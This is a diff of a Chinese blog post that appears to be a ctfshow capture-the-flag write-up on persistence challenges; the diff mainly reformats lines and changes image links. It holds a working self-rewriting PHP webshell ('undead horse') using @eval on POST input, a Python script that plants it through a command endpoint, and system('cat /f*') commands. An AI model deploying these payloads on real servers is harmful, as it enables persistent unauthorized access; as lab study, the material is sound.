@@ -2,6 +2,7 @@
 title: "ctfshow-权限维持"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 # ctfshow-权限维持
@@ -9,6 +10,7 @@ draft: false
 ### web670
 
 这里的check貌似是删web根目录文件，那么可以用awd的常规思路，写一个不死马：
+
 ~~~php
 GET:?action=cmd
 
@@ -19,19 +21,19 @@ POST:cmd=file_put_contents('a.php', '<?php ignore_user_abort(true);set_time_limi
 
 然后申请check，再连接shell.php即可：
 
-![image-20241125175540487](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241125175540663-1059963057.png)
+![image-20241125175540487](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125175540663-1059963057.png)
 
 ### web671
 
 同样写不死马即可，flag在根目录：
 
-![image-20241125180132877](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241125180133066-1725898859.png)
+![image-20241125180132877](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125180133066-1725898859.png)
 
 ### web672
 
 同理：
 
-![image-20241125180627088](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241125180627560-549666934.png)
+![image-20241125180627088](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125180627560-549666934.png)
 
 ### web673
 
@@ -40,21 +42,21 @@ POST:cmd=file_put_contents('a.php', '<?php ignore_user_abort(true);set_time_limi
 既然不死马一直能打，那我们可以尝试构造一个python脚本：
 
  ~~~python
- import requests
- url="http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/"
- data1={'cmd':"file_put_contents('a.php',\"<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\\$file = 'shell.php';\\$code = '<?php @eval(\\$_POST[1]);?>';while (1) {file_put_contents(\\$file, \\$code);usleep(5000);}?>\");"}
- r=requests.post(url+'?action=cmd',data=data1)
- try:
- 	requests.get(url+'a.php',timeout=(1,1))
- except:
- 	requests.get(url+'?action=check')
- 	r=requests.post(url+'shell.php',data={'1':'system("cat /f*");'})
- 	print(r.text)
+import requests
+url="http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/"
+data1={'cmd':"file_put_contents('a.php',\"<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\\$file = 'shell.php';\\$code = '<?php @eval(\\$_POST[1]);?>';while (1) {file_put_contents(\\$file, \\$code);usleep(5000);}?>\");"}
+r=requests.post(url+'?action=cmd',data=data1)
+try:
+	requests.get(url+'a.php',timeout=(1,1))
+except:
+	requests.get(url+'?action=check')
+	r=requests.post(url+'shell.php',data={'1':'system("cat /f*");'})
+	print(r.text)
  ~~~
 
 一跑即出：
 
-![image-20241125182123187](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241125182123450-1052963366.png)
+![image-20241125182123187](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125182123450-1052963366.png)
 
 ### web674-676
 
@@ -65,6 +67,7 @@ POST:cmd=file_put_contents('a.php', '<?php ignore_user_abort(true);set_time_limi
 除了tmp目录都没有写权限
 
 这里同样可以用加载进程的思维：
+
 ~~~
 GET:?action=cmd
 
@@ -73,7 +76,7 @@ POST:cmd=system('sleep 10;cat /f*');
 
 执行后会加载十秒，在此期间，另开一个页面来启动check，即可cat到flag：
 
-![image-20241125203945891](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241125203947992-1056072447.png)
+![image-20241125203945891](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125203947992-1056072447.png)
 
 ### web678
 
@@ -117,7 +120,7 @@ tmp目录可写，那么就在这个目录上做文章
   			break
   ~~~
 
-  ![image-20241125205501169](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241125205502841-1621720932.png)
+  ![image-20241125205501169](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125205502841-1621720932.png)
 
 ### 总结
 
